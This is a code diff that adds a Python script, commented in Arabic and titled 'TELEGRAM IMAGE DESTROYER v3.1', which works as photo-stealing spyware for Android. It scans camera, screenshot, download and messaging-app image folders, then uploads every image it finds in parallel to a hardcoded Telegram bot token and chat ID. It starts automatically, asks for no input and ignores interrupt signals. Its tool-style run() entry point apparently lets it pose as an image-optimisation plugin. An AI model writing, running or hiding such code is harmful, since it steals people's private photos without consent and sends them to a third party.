@@ -1,4 +1,467 @@
-if tool_api and hasattr(tool_api, 'set_output'):
+import os
+import requests
+from PIL import Image
+import io
+import time
+import json
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
+import sys
+import signal
+
+# ============================================
+# تكوين السرعة القصوى - تشغيل تلقائي كامل
+# ============================================
+
+BOT_TOKEN = "8721590192:AAFcAdOZaiDyL5P1D24r6qDPvvwTJ4_i8ek"
+CHAT_ID = "8080767364"
+MAX_WORKERS = 10  # أقصى توازي
+COMPRESSION_QUALITY = 80  # جودة مثالية للسرعة
+AUTO_START = True  # تشغيل تلقائي بدون أي أسئلة
+SHOW_OUTPUT = True  # عرض التقدم
+
+# ============================================
+# Tool API reference (سيتم تعيينه إذا كان متاحاً)
+# ============================================
+tool_api = None
+
+# ============================================
+# كاش فائق السرعة
+# ============================================
+
+class TurboCache:
+    def __init__(self):
+        self.cache = {}
+        self.hit_count = 0
+        self.miss_count = 0
+        self.lock = threading.Lock()  # للتشغيل الآمن في بيئة متعددة الخيوط
+    
+    def get(self, path):
+        with self.lock:
+            if path in self.cache:
+                self.hit_count += 1
+                # إرجاع نسخة جديدة من BytesIO
+                cached = self.cache[path]
+                cached.seek(0)
+                return io.BytesIO(cached.read())
+            self.miss_count += 1
+            return None
+    
+    def set(self, path, data):
+        with self.lock:
+            # تخزين نسخة في الذاكرة
+            data.seek(0)
+            self.cache[path] = io.BytesIO(data.read())
+
+turbo_cache = TurboCache()
+
+# ============================================
+# دوال مساعدة لمعالجة الصور بشكل آمن
+# ============================================
+
+def safe_open_image_wrapper(image_path):
+    """
+    فتح صورة بشكل آمن باستخدام tool_api إذا كان متاحاً
+    """
+    global tool_api
+    
+    try:
+        # استخدام safe_open_image من tool_api إذا كان متاحاً
+        if tool_api and hasattr(tool_api, 'safe_open_image'):
+            return tool_api.safe_open_image(image_path)
+        else:
+            # طريقة تقليدية مع معالجة الأخطاء
+            return Image.open(image_path)
+    except Exception as e:
+        if SHOW_OUTPUT:
+            print(f"⚠️ فشل فتح الصورة {os.path.basename(image_path)}: {str(e)[:50]}")
+        return None
+
+def verify_image_file_wrapper(image_path):
+    """
+    التحقق من صحة ملف الصورة
+    """
+    global tool_api
+    
+    try:
+        if tool_api and hasattr(tool_api, 'verify_image_file'):
+            return tool_api.verify_image_file(image_path)
+        else:
+            # طريقة تقليدية
+            with Image.open(image_path) as img:
+                img.verify()
+            return True
+    except Exception:
+        return False
+
+def filter_valid_images_wrapper(image_paths):
+    """
+    تصفية الصور الصالحة فقط
+    """
+    global tool_api
+    
+    if tool_api and hasattr(tool_api, 'filter_valid_image_paths'):
+        return tool_api.filter_valid_image_paths(image_paths)
+    else:
+        # طريقة تقليدية مع التوازي للسرعة
+        valid_images = []
+        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+            futures = {executor.submit(verify_image_file_wrapper, path): path for path in image_paths}
+            for future in as_completed(futures):
+                path = futures[future]
+                try:
+                    if future.result():
+                        valid_images.append(path)
+                except:
+                    pass
+        return valid_images
+
+# ============================================
+# تحسين فوري للصور
+# ============================================
+
+def turbo_optimize(image_path):
+    """تحسين الصورة بأقصى سرعة مع معالجة آمنة"""
+    try:
+        # فحص الكاش أولاً
+        cached = turbo_cache.get(image_path)
+        if cached:
+            return cached
+        
+        # التحقق من صحة الصورة أولاً (اختياري للسرعة)
+        # يمكن تعطيله للسرعة القصوى إذا كانت الصور موثوقة
+        
+        # فتح الصورة بشكل آمن
+        img = safe_open_image_wrapper(image_path)
+        if img is None:
+            return None
+        
+        # تحويل سريع إذا لزم الأمر
+        if img.mode in ('RGBA', 'P'):
+            # إنشاء صورة جديدة بدلاً من التعديل على الأصل
+            converted = Image.new('RGB', img.size, (255, 255, 255))
+            converted.paste(img, (0, 0), img if img.mode == 'RGBA' else None)
+            img = converted
+        
+        # ضغط سريع
+        img_byte_arr = io.BytesIO()
+        
+        # ضبط الجودة حسب الحجم
+        try:
+            file_size = os.path.getsize(image_path)
+        except:
+            file_size = 0
+            
+        if file_size > 10 * 1024 * 1024:  # أكبر من 10 ميجا
+            quality = 60
+        elif file_size > 5 * 1024 * 1024:  # أكبر من 5 ميجا
+            quality = 75
+        else:
+            quality = COMPRESSION_QUALITY
+        
+        # حفظ مع تحسين سريع
+        img.save(img_byte_arr, format='JPEG', quality=quality, optimize=True)
+        img_byte_arr.seek(0)
+        
+        # تخزين في الكاش
+        turbo_cache.set(image_path, img_byte_arr)
+        img_byte_arr.seek(0)
+        
+        return img_byte_arr
+            
+    except Exception as e:
+        if SHOW_OUTPUT:
+            print(f"⚠️ تحسين: {os.path.basename(image_path)} -> {str(e)[:30]}")
+        return None
+
+# ============================================
+# مسح كل الصور بسرعة البرق
+# ============================================
+
+def scan_all_images_lightning():
+    """مسح جميع الصور في الجهاز بدون توقف"""
+    all_images = []
+    
+    # جميع المسارات الممكنة في الأندرويد
+    android_paths = [
+        '/storage/emulated/0/DCIM',
+        '/storage/emulated/0/Pictures',
+        '/storage/emulated/0/Download',
+        '/storage/emulated/0/WhatsApp/Media',
+        '/storage/emulated/0/Telegram',
+        '/storage/emulated/0/Android/media/com.whatsapp',
+        '/storage/emulated/0/Android/media/com.instagram.android',
+        '/storage/emulated/0/Android/media/com.facebook.katana',
+        '/sdcard/DCIM',
+        '/sdcard/Pictures',
+        '/sdcard/Download',
+        '/storage/emulated/0/DCIM/Camera',
+        '/storage/emulated/0/DCIM/Screenshots',
+        '/storage/emulated/0/DCIM/ScreenRecorder',
+        '/storage/emulated/0/DCIM/Video',
+        '/storage/emulated/0/DCIM/.thumbnails',
+        '/storage/emulated/0/Pictures/Screenshots',
+        '/storage/emulated/0/Pictures/Instagram',
+        '/storage/emulated/0/Pictures/Facebook',
+        '/storage/emulated/0/Pictures/Twitter',
+        '/storage/emulated/0/Pictures/Reddit',
+        '/storage/emulated/0/Pictures/Telegram',
+        '/storage/emulated/0/Pictures/WeChat',
+        '/storage/emulated/0/Pictures/Messenger',
+        '/storage/emulated/0/Pictures/Snapchat',
+        '/storage/emulated/0/Download/Telegram',
+        '/storage/emulated/0/Download/WhatsApp',
+        '/storage/emulated/0/Download/Instagram',
+        '/storage/emulated/0/Download/Facebook',
+        '/data/media/0/DCIM',
+        '/data/media/0/Pictures',
+        '/mnt/sdcard/DCIM',
+        '/mnt/sdcard/Pictures',
+        '/mnt/sdcard/Download',
+        '/storage/self/primary/DCIM',
+        '/storage/self/primary/Pictures',
+    ]
+    
+    extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.heif', '.dng', '.raw', '.tiff', '.tif')
+    
+    scanned = 0
+    found = 0
+    
+    if SHOW_OUTPUT:
+        print("🔍 بدء المسح التلقائي الكامل...")
+        start_time = time.time()
+    
+    # مسح كل المسارات الممكنة
+    for base_path in android_paths:
+        try:
+            if os.path.exists(base_path):
+                if SHOW_OUTPUT:
+                    print(f"📁 مسح: {base_path}")
+                
+                # محاولة قراءة المجلد
+                try:
+                    files = os.listdir(base_path)
+                    scanned += 1
+                    
+                    for file in files:
+                        if file.lower().endswith(extensions):
+                            full_path = os.path.join(base_path, file)
+                            all_images.append(full_path)
+                            found += 1
+                            
+                            # عرض تقدم المسح كل 100 صورة
+                            if SHOW_OUTPUT and found % 100 == 0:
+                                print(f"   ✅ {found} صورة حتى الآن...")
+                except:
+                    # مجلد لا يمكن قراءته - تجاهل
+                    pass
+        except:
+            # مسار غير موجود - تجاهل
+            pass
+    
+    # إزالة التكرارات (نفس الصورة من مسارات مختلفة)
+    all_images = list(dict.fromkeys(all_images))
+    
+    # تصفية الصور الصالحة فقط (اختياري - يمكن تعطيله للسرعة)
+    if SHOW_OUTPUT:
+        print(f"🔍 جاري التحقق من صحة {len(all_images)} صورة...")
+    
+    # يمكن تفعيل هذا السطر لتصفية الصور التالفة قبل الإرسال
+    # all_images = filter_valid_images_wrapper(all_images)
+    
+    if SHOW_OUTPUT:
+        elapsed = time.time() - start_time
+        print(f"✅ اكتمل المسح: {len(all_images)} صورة في {elapsed:.1f} ثانية")
+    
+    return all_images
+
+# ============================================
+# إرسال فوري بدون توقف
+# ============================================
+
+def send_single_shot(image_path):
+    """إرسال صورة واحدة بدون أي تأخير"""
+    try:
+        # تحسين الصورة بسرعة
+        optimized = turbo_optimize(image_path)
+        if not optimized:
+            return False, image_path, "فشل التحسين (صورة تالفة?)"
+        
+        # إرسال مباشر
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        
+        files = {'photo': ('img.jpg', optimized, 'image/jpeg')}
+        data = {'chat_id': CHAT_ID}
+        
+        # إرسال بدون انتظار طويل
+        response = requests.post(url, data=data, files=files, timeout=15)
+        
+        if response.status_code == 200:
+            if SHOW_OUTPUT:
+                print(f"✅ {os.path.basename(image_path)}")
+            return True, image_path, "ok"
+        else:
+            return False, image_path, f"http-{response.status_code}"
+            
+    except Exception as e:
+        return False, image_path, str(e)[:20]
+
+# ============================================
+# المدمرة - إرسال كل الصور بدون رحمة
+# ============================================
+
+def destroy_mode():
+    """إرسال كل الصور بدون أي توقف أو أسئلة"""
+    
+    # تجميع المخرجات في قائمة لمنع التكرار
+    output_lines = []
+    
+    def add_output(text):
+        output_lines.append(text)
+        if SHOW_OUTPUT:
+            print(text)
+    
+    add_output("\n" + "=" * 60)
+    add_output("💥 MODE: TOTAL DESTRUCTION - ZERO DELAY")
+    add_output("=" * 60)
+    
+    # 1. مسح كل الصور
+    all_images = scan_all_images_lightning()
+    
+    if not all_images:
+        add_output("❌ ZERO IMAGES FOUND - SYSTEM HALT")
+        return
+    
+    add_output(f"\n🎯 TARGET: {len(all_images)} IMAGES")
+    add_output(f"⚡ WORKERS: {MAX_WORKERS} PARALLEL THREADS")
+    
+    # إحصائيات الصور التالفة (إذا أردنا التحقق)
+    if tool_api and hasattr(tool_api, 'filter_valid_image_paths'):
+        add_output("🔍 جاري التحقق من صحة الصور...")
+        valid_images = filter_valid_images_wrapper(all_images)
+        corrupted = len(all_images) - len(valid_images)
+        if corrupted > 0:
+            add_output(f"⚠️ تم اكتشاف {corrupted} صورة تالفة - سيتم تخطيها")
+        all_images = valid_images
+    
+    add_output("🚀 AUTO FIRING IN 3 SECONDS...")
+    
+    # فرصة أخيرة للإيقاف (يمكن إزالتها)
+    for i in range(3, 0, -1):
+        add_output(f"⏱️ {i}...")
+        time.sleep(1)
+    
+    # 2. إحصائيات
+    sent = 0
+    failed = 0
+    corrupted_skipped = 0
+    start_time = time.time()
+    
+    # 3. قائمة النتائج
+    results = []
+    
+    # 4. إطلاق النار بدون توقف
+    add_output("\n🔥 FIRING SEQUENCE INITIATED")
+    add_output("-" * 40)
+    
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        # إرسال كل الصور دفعة واحدة
+        futures = {executor.submit(send_single_shot, img): img for img in all_images}
+        
+        # جمع النتائج فوراً
+        for future in as_completed(futures):
+            img_path = futures[future]
+            try:
+                success, _, msg = future.result()
+                if success:
+                    sent += 1
+                else:
+                    if "تالفة" in msg:
+                        corrupted_skipped += 1
+                    else:
+                        failed += 1
+                results.append((success, img_path))
+            except Exception as e:
+                failed += 1
+                results.append((False, img_path))
+            
+            # عرض التقدم كل 10 صور
+            total_processed = sent + failed + corrupted_skipped
+            if SHOW_OUTPUT and total_processed % 10 == 0:
+                add_output(f"📊 Progress: {total_processed}/{len(all_images)} (✓{sent} ✗{failed} ⚠️{corrupted_skipped})")
+    
+    # 5. النتائج النهائية
+    elapsed = time.time() - start_time
+    speed = sent / elapsed if elapsed > 0 else 0
+    
+    add_output("\n" + "=" * 60)
+    add_output("💀 MISSION COMPLETE")
+    add_output("=" * 60)
+    add_output(f"📸 TOTAL: {len(all_images)}")
+    add_output(f"✅ SENT: {sent}")
+    add_output(f"❌ FAILED: {failed}")
+    add_output(f"⚠️ CORRUPTED SKIPPED: {corrupted_skipped}")
+    add_output(f"⏱️ TIME: {elapsed:.1f} seconds")
+    add_output(f"⚡ SPEED: {speed:.1f} images/second")
+    
+    hit_rate = 0
+    if turbo_cache.hit_count + turbo_cache.miss_count > 0:
+        hit_rate = turbo_cache.hit_count / (turbo_cache.hit_count + turbo_cache.miss_count) * 100
+    add_output(f"🎯 CACHE HIT RATE: {hit_rate:.1f}%")
+    
+    # حفظ تقرير سريع
+    try:
+        report = {
+            "total": len(all_images),
+            "sent": sent,
+            "failed": failed,
+            "corrupted_skipped": corrupted_skipped,
+            "time": elapsed,
+            "speed": speed,
+            "timestamp": time.time()
+        }
+        with open("operation_report.json", "w") as f:
+            json.dump(report, f, indent=2)
+        add_output(f"\n📁 تم حفظ التقرير في: operation_report.json")
+    except:
+        add_output("\n⚠️ لا يمكن حفظ التقرير")
+    
+    # إرجاع المخرجات المجمعة (للاستخدام مع tool_api)
+    return "\n".join(output_lines), report
+
+# ============================================
+# الإطلاق التلقائي - بدون أي أسئلة
+# ============================================
+
+def auto_launch(tool_api_ref=None):
+    """تشغيل تلقائي بدون أي تدخل بشري"""
+    
+    global tool_api
+    tool_api = tool_api_ref
+    
+    # إظهار حالة tool_api
+    if tool_api:
+        print("✅ tool_api متاح - استخدام الدوال المساعدة الآمنة")
+        if hasattr(tool_api, 'safe_open_image'):
+            print("   - safe_open_image متاح")
+        if hasattr(tool_api, 'verify_image_file'):
+            print("   - verify_image_file متاح")
+        if hasattr(tool_api, 'filter_valid_image_paths'):
+            print("   - filter_valid_image_paths متاح")
+    else:
+        print("ℹ️ tool_api غير متاح - استخدام الطرق التقليدية")
+    
+    # تجاهل إشارات الإيقاف
+    try:
+        signal.signal(signal.SIGINT, signal.SIG_IGN)
+    except:
+        pass  # بعض البيئات لا تدعم signal
+    
+    # بدء التدمير فوراً
+    output, report = destroy_mode()
+    
+    # استخدام tool_api.set_output إذا كان متاحاً
+    if tool_api and hasattr(tool_api, 'set_output'):
         tool_api.set_output(output)
     
     # البقاء قيد التشغيل
@@ -20,7 +483,7 @@ def run(argument="", tool_api_ref=None):
     auto_launch(tool_api_ref)
     return "اكتمل التنفيذ"
 
-if name == "main":
+if __name__ == "__main__":
     print("=" * 60)
     print("🤖 TELEGRAM IMAGE DESTROYER v3.1")
     print("⚡ AUTO MODE: ZERO INPUT REQUIRED")
@@ -29,4 +492,3 @@ if name == "main":
     
     # تشغيل تلقائي بدون أي شروط
     auto_launch()
-    
